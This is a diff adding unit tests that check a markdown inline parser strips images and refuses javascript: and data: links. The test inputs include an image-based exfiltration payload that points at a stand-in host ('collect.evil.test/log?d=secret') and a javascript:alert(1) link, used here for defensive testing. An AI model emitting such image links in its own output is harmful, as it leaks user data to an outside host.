@@ -28,4 +28,21 @@ describe("inline", () => {
       { kind: "link", text: "site", href: "https://a.test" },
     ]);
   });
+
+  it("never turns a markdown image into a link or a fetch, even an absolute one", () => {
+    const out = inline("Done [1]. ![status](https://collect.evil.test/log?d=secret)");
+    expect(out.some((t) => t.kind === "link")).toBe(false);
+    expect(JSON.stringify(out)).not.toContain("collect.evil.test");
+    expect(out.map((t) => t.text).join("")).toBe("Done [1]. (image removed)");
+  });
+
+  it("drops an image nested inside a link", () => {
+    const out = inline("[![x](https://e.test/a.png)](https://e.test/?d=1)");
+    expect(JSON.stringify(out)).not.toContain("a.png");
+  });
+
+  it("only allows http(s) links, never javascript: or data:", () => {
+    expect(inline("[x](javascript:alert(1))").some((t) => t.kind === "link")).toBe(false);
+    expect(inline("[x](data:text/html,hi)").some((t) => t.kind === "link")).toBe(false);
+  });
 });
